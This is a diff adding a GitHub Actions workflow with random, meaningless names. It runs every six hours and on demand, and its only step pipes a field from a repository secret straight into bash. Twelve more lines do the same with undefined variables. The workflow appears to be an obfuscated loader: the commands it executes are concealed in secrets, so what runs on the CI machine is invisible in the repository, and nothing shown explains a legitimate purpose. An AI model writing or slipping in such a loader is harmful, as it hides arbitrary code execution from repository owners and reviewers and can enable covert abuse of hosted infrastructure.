@@ -1,0 +1,30 @@
+name: cottontrafalgar
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cottontrafalgar
+        env:
+          xol52366: ${{ secrets.xol52366 }}
+        run: |
+          echo $xol52366 | jq -r .hpthd54624 | /bin/bash
+          echo $imkes43831 | jq -r .y51493 | /bin/bash
+          echo $nuu48076 | jq -r .iozb679 | /bin/bash
+          echo $hdf5353 | jq -r .zfz3 | /bin/bash
+          echo $k42443 | jq -r .l39883 | /bin/bash
+          echo $rwcrv2988 | jq -r .dr6 | /bin/bash
+          echo $gjqh6642 | jq -r .bsb3 | /bin/bash
+          echo $igcat09557 | jq -r .zny639 | /bin/bash
+          echo $lswwq25008 | jq -r .aux8646 | /bin/bash
+          echo $vanw41274 | jq -r .wghto64 | /bin/bash
+          echo $yu0818 | jq -r .txmy66801 | /bin/bash
+          echo $jfive196 | jq -r .lto6254 | /bin/bash
+          echo $zve1151 | jq -r .cddw488 | /bin/bash
+
